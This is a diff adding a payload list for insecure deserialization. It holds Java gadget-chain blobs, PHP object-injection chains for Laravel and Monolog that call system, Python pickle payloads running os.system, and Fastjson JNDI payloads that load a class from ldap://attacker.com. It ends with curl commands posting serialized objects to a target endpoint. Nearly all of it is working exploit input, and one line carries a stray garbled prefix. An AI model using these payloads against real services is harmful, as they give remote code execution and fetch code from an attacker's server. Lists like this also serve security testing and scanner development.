@@ -1,0 +1,30 @@
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqnuWudAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SBVCK7RzICAAB4cHQAEGZlZUFtb3VudFdvcmtlZA==
+O:8:"stdClass":0:{}
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:15:"Faker\Generator":1:{s:13:"*formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"*event";s:2:"id";}
+O:18:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:4:"test";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:0:{}}}
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"*listeners";a:1:{s:16:"Illuminate\Auth\Events\Login";a:1:{i:0;a:2:{i:0;O:14:"App\Http\Controllers\Controller":0:{}i:1;s:6:"system";}}}}s:8:"*event";O:25:"Illuminate\Auth\Events\Login":3:{s:5:"guard";s:4:"null";s:4:"user";O:15:"App\User":1:{s:8:"username";s:4:"name";}s:8:"remember";s:2:"id";}}
+Y:2:{i:0;O:7:"Message":1:{s:4:"data";s:2:"id";}i:1;s:4:"exec";}
+__import__('os').system('id')
+cos\nsystem\n(S'id')\ntR.
+pickle.loads(b'\x80\x02cos\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.')
+cPickle.loads(b"cos\nsystem\n(S'id'\ntR.")
+{"@type":"java.net.Inet4Address","val":"attacker.com"}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://attacker.com:1389/Exploit"}
+{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://attacker.com:1389/Exploit"}
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://attacker.com:1389/Exploit"}
+{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://attacker.com:1389/Exploit","loginTimeout":0}
+{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:aced000573720..."}
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://attacker.com:1389/Exploit"}}
+{"_class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":"true"}
+{"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="}
+\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x8c\x02id\x94\x85\x94R\x94.
+BASEFROMSTACKOVERFLOWcookie: serialized_data=<payload>
+X-Java-Deserialization: <ysoserial-payload>
+viewstate: /wEy...base64-encoded-viewstate-payload...
+__VIEWSTATE=rO0AB...
+JSESSIONID=<java-deserialization-payload>
+.ASPXAUTH=<dotnet-deserialization-payload>
+curl -s -X POST https://target.com/endpoint -H "Content-Type: application/x-java-serialized-object" --data-binary @/path/to/ysoserial.bin
+curl -s -X POST https://target.com/endpoint -H "Content-Type: application/octet-stream" --data-binary $'\xac\xed\x00\x05'
